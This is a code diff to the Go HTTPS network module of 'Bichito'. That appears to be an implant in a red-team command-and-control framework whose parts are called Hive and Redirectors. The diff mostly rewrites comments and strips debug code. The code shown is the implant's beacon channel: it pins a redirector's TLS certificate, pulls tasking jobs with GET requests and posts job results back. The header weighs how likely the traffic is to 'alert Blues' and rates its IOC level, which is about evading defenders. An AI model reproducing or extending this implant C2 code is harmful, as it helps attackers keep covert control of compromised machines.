@@ -5,9 +5,9 @@
 //					 generated previously in Implant Generation. The Bichito checks the target tls
 //					 signature to make sure is the redirector
 //
-//   Warnings:       Could not work with MITM tls proxies, and could alert Blues					 
+//   Warnings:       Could not work with MITM tls proxies					 
 //					 
-//	 Fingenprint:    GO-LANG TLS Libraries (target OS network stack?)
+//	 Fingenprint:    GO-LANG Client TLS Fingerprint
 //
 //   IOC Level:      Medium
 //   
@@ -20,21 +20,21 @@ package network
 import (
 
 	"crypto/tls"
-	//Debug:
-	//"fmt"
 	"strings"
 	"bytes"
 	"crypto/sha256"
 	"encoding/hex"
     "net/http"
     "encoding/json"	
-    //Debug import
-    //"net/http/httputil"
     "io/ioutil"
     "time"
     "net"
 )
 
+/*
+JSON Structures for Compiling Redirectors Network Module parameters
+Hive will have the same definitions in: ./src/hive/hiveImplants.go
+*/
 type BiParanoidhttps struct {
 	Port string   `json:"port"`
 	RedFingenPrint string   `json:"redfingenrpint"`
@@ -43,10 +43,12 @@ type BiParanoidhttps struct {
 
 var moduleParams *BiParanoidhttps
 
-//Decode Module Parameters, create listener socket and redirectors slice. 
-//Redirectors for https paranoid: Domain:Port
-//This will be saved on memory till process death.
-
+/*
+Description: Paranoidhttps,Prepare Redirector Slice
+Flow:
+A.JSON Decode redirector data
+B.Loop over each redirector and craft a working https endpoint to connect to
+*/
 func PrepareNetworkMocule(jsonstring string) []string{
 
 	var redirectors []string
@@ -61,7 +63,12 @@ func PrepareNetworkMocule(jsonstring string) []string{
 	return redirectors
 }
 
-//Use Https to retrieve from redirector Jobs for this Bot
+/*
+Description: Paranoidhttps,Retrieve Jobs
+Flow:
+A.Prepare https client, check that target redirector ssl certificate match the saved one
+B.Get request against target redirector to retrieve jobs
+*/
 func RetrieveJobs(redirector string,authentication string) ([]byte,string){
 
 	var newJobs []byte
@@ -101,20 +108,17 @@ func RetrieveJobs(redirector string,authentication string) ([]byte,string){
 		return newJobs,error
 	}
 
-	//Debug: Get request
-	/*
-	requestDump, err2 := httputil.DumpResponse(res, true)
-	if err2 != nil {
-  		fmt.Println(err2)
-	}
-	fmt.Println(string(requestDump))
-	*/
 
 	newJobs,_ = ioutil.ReadAll(res.Body)
     return newJobs,"Success"
 }
 
-//Use Https to send a Job to the redirector
+/*
+Description: Paranoidhttps,Retrieve Jobs
+Flow:
+A.Prepare https client, configure the client to accept self-signed certificates
+B.POST request against target redirector to send a job
+*/
 func SendJobs(redirector string,authentication string,encodedJob []byte) string{
 
 	var error string
@@ -154,14 +158,6 @@ func SendJobs(redirector string,authentication string,encodedJob []byte) string{
 		return error
 	}
 
-	//Debug: Post Request
-	/*
-	requestDump, err2 := httputil.DumpRequest(req, true)
-	if err2 != nil {
-  		fmt.Println(err2)
-	}
-	fmt.Println(string(requestDump))
-	*/
 
 	return "Success"
 }
